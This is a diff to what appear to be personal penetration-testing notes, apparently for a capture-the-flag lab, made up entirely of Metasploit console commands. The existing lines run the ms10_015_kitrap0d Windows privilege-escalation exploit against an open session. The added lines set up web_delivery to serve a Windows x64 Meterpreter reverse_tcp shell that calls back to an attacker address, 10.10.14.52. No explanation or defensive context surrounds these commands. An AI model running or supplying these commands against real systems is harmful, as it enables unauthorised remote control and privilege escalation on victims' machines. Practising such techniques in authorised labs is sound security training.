@@ -14,3 +14,15 @@ Run one of the suggested exploit
 use exploit/windows/local/ms10_015_kitrap0d
 set session 1
 run
+
+*****************************************************************************************************************************
+
+Generate Windows reverse shell 
+
+use exploit/multi/script/web_delivery
+set target 2
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.14.52
+set srvhost 10.10.14.52
+exploit
+
